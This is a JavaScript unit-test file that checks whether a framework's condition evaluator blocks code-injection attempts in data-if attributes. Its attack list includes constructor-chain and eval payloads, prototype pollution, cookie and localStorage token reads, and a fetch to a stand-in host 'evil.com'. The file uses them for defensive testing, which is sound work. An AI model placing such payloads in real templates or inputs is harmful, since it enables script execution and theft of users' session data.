/**
 * Security tests for safeEvaluateCondition
 * Verifies that RCE and injection attacks are blocked
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { loadComponents } from '../../framework/ComponentLoader.js';
import { registerComponent } from '../../framework/Registry.js';

describe('safeEvaluateCondition Security', () => {
    let container;
    let consoleWarnSpy;

    beforeEach(() => {
        container = document.createElement('div');
        document.body.appendChild(container);
        consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
    });

    afterEach(() => {
        container.remove();
        consoleWarnSpy.mockRestore();
    });

    // Register a simple test component
    beforeEach(() => {
        registerComponent('TestBox', ({ children }) => {
            const div = document.createElement('div');
            div.className = 'test-box';
            div.textContent = 'Rendered';
            return div;
        });
    });

    describe('blocks RCE attack vectors', () => {
        const attacks = [
            // Constructor chain attacks
            "constructor.constructor('alert(1)')()",
            "constructor['constructor']('alert(1)')()",

            // Prototype pollution
            "__proto__.polluted = true",
            "prototype.polluted = true",

            // Global access
            "window.location = 'evil.com'",
            "document.cookie",
            "global.process",

            // Code execution
            "eval('alert(1)')",
            "Function('return this')()",

            // Network access
            "fetch('https://evil.com')",
            "XMLHttpRequest",

            // Storage access
            "localStorage.getItem('token')",
            "sessionStorage.setItem('x', 'y')",

            // Bracket notation tricks
            "state['constructor']",
            "state[`__proto__`]",

            // Template literals
            "${alert(1)}",
            "`${document.cookie}`",

            // Function calls
            "someFunc()",
            "obj.method()",
        ];

        attacks.forEach(attack => {
            it(`blocks: ${attack.slice(0, 40)}${attack.length > 40 ? '...' : ''}`, () => {
                container.innerHTML = `<TestBox data-if="${attack.replace(/"/g, '&quot;')}"></TestBox>`;

                const state = { isAdmin: true, user: { name: 'test' } };
                loadComponents(container, state);

                // Component should NOT render (attack blocked)
                const rendered = container.querySelector('.test-box');
                expect(rendered).toBeNull();
            });
        });
    });

    describe('allows safe expression patterns', () => {
        const safeExpressions = [
            { expr: 'isVisible', state: { isVisible: true }, shouldRender: true },
            { expr: 'isVisible', state: { isVisible: false }, shouldRender: false },
            { expr: '!isHidden', state: { isHidden: false }, shouldRender: true },
            { expr: 'user.isAdmin', state: { user: { isAdmin: true } }, shouldRender: true },
            { expr: 'count > 0', state: { count: 5 }, shouldRender: true },
            { expr: 'count < 10', state: { count: 5 }, shouldRender: true },
            { expr: 'count >= 5', state: { count: 5 }, shouldRender: true },
            { expr: 'count <= 5', state: { count: 5 }, shouldRender: true },
            { expr: "status === 'active'", state: { status: 'active' }, shouldRender: true },
            { expr: "status !== 'inactive'", state: { status: 'active' }, shouldRender: true },
            { expr: 'isAdmin && isActive', state: { isAdmin: true, isActive: true }, shouldRender: true },
            { expr: 'isAdmin && isActive', state: { isAdmin: true, isActive: false }, shouldRender: false },
            { expr: 'isAdmin || isGuest', state: { isAdmin: false, isGuest: true }, shouldRender: true },
            { expr: 'items.length > 0', state: { items: { length: 5 } }, shouldRender: true },
        ];

        safeExpressions.forEach(({ expr, state, shouldRender }) => {
            it(`evaluates: ${expr} = ${shouldRender}`, () => {
                container.innerHTML = `<TestBox data-if="${expr}"></TestBox>`;

                loadComponents(container, state);

                const rendered = container.querySelector('.test-box');
                if (shouldRender) {
                    expect(rendered).not.toBeNull();
                } else {
                    expect(rendered).toBeNull();
                }
            });
        });
    });

    describe('prototype access prevention', () => {
        it('blocks __proto__ access in property paths', () => {
            container.innerHTML = `<TestBox data-if="obj.__proto__.polluted"></TestBox>`;

            const state = { obj: { __proto__: { polluted: true } } };
            loadComponents(container, state);

            expect(container.querySelector('.test-box')).toBeNull();
            expect(consoleWarnSpy).toHaveBeenCalled();
        });

        it('blocks constructor access in property paths', () => {
            container.innerHTML = `<TestBox data-if="obj.constructor.name"></TestBox>`;

            const state = { obj: {} };
            loadComponents(container, state);

            expect(container.querySelector('.test-box')).toBeNull();
        });
    });

    describe('edge cases', () => {
        it('handles null state gracefully', () => {
            container.innerHTML = `<TestBox data-if="isVisible"></TestBox>`;

            loadComponents(container, null);

            // Should not throw, should not render
            expect(container.querySelector('.test-box')).toBeNull();
        });

        it('handles undefined properties gracefully', () => {
            container.innerHTML = `<TestBox data-if="nonexistent.deep.path"></TestBox>`;

            const state = {};
            loadComponents(container, state);

            // Should not throw, should not render (undefined is falsy)
            expect(container.querySelector('.test-box')).toBeNull();
        });

        it('handles empty expression gracefully', () => {
            container.innerHTML = `<TestBox data-if=""></TestBox>`;

            const state = { isVisible: true };
            loadComponents(container, state);

            // Empty data-if attribute means no condition - component renders
            // This is expected behavior (no condition = always render)
            expect(container.querySelector('.test-box')).not.toBeNull();
        });
    });
});
